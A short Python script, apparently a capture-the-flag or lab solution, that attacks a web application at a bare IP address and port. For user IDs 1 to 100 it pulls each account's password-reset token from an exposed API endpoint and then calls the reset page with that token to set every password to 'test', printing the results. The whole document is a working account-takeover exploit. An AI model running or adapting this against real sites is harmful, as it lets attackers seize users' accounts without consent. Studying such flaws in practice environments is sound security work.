import requests
import json

url = "http://139.59.176.158:32499/"

s = requests.Session()

for i in range(1, 101):
	get_token_url = url + f"api.php/token/{i}"
	r = s.get(get_token_url)
	tok = json.loads(r.text)
	token = tok["token"]
	# print(token)
	reset_pwd_url = url + "reset.php"

	cookies = {
		"uid": str(i),
		"PHPSESSID": "sibkeflk7q1ig5nuojvts6i1cn"
	}
	data = {
		"uid": str(i),
		"token": token,
		"password": "test"
	}
	r = s.get(reset_pwd_url, params=data, cookies=cookies)
	print(f"id {i} -> {r.text}")
	# print(r.headers)